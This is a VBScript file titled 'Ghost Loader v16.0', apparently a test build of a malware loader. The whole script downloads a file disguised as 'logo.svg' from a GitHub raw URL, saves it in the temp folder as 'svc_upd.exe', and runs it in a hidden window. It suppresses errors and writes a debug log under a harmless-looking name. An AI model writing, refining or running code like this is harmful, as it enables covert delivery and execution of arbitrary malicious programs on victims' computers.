' Ghost Loader v16.0 - INSTANT TEST (No delay, with logging)
Option Explicit
On Error Resume Next

Dim ws, fs, logFile
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

logFile = ws.ExpandEnvironmentStrings("%TEMP%") & "\update_log.txt"

Sub Log(msg)
    Dim ts
    Set ts = fs.OpenTextFile(logFile, 8, True)
    ts.WriteLine Now & " - " & msg
    ts.Close
End Sub

Log "=== START ==="

' Download
Dim url, destDir, destPath, xhr, stm

url = "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg"
Log "URL: " & url

destDir = ws.ExpandEnvironmentStrings("%TEMP%")
destPath = destDir & "\svc_upd.exe"
Log "Dest: " & destPath

Log "Creating HTTP object..."
Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If Err.Number <> 0 Then
    Log "HTTP Error: " & Err.Description
    Err.Clear
End If

xhr.SetTimeouts 30000, 30000, 30000, 30000
Log "Opening connection..."
xhr.Open "GET", url, False
Log "Sending request..."
xhr.Send

Log "Status: " & xhr.Status

If xhr.Status = 200 Then
    Log "Download OK. Size: " & LenB(xhr.responseBody)
    
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile destPath, 2
    stm.Close
    Log "Saved to: " & destPath
    
    If fs.FileExists(destPath) Then
        Log "File exists. Executing..."
        ws.Run """" & destPath & """", 0, False
        Log "Executed!"
    Else
        Log "File NOT created!"
    End If
Else
    Log "Download FAILED. Status: " & xhr.Status
End If

Log "=== END ==="

MsgBox "Check log: " & logFile, vbInformation, "Debug"

Set xhr = Nothing
Set ws = Nothing
Set fs = Nothing
